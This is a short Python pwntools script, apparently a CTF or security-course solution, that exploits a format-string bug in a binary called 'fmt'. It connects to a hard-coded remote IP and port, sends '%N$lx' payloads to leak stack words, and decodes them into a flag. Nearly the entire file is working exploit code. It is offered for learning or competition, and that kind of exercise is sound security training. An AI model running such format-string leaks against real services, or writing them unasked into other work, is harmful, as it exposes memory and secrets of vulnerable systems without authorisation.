#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
from ctypes import CDLL
import sys, random

context.arch = 'amd64'
context.os = 'linux'

exe = '../fmt/fmt'
port = 30172

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('140.113.24.241', port)

buf = []
for i in range(10, 15):
    payload = f'%{i}$lx\n'.encode()
    r.send(payload)
    buf.append(r.recv())
    r.close()
    r = remote('140.113.24.241',port)

flag = ''
for data in buf:
    byte_arr = bytes.fromhex(data.decode())
    flag += byte_arr.decode('ascii')[::-1]
r.close()
success(flag)
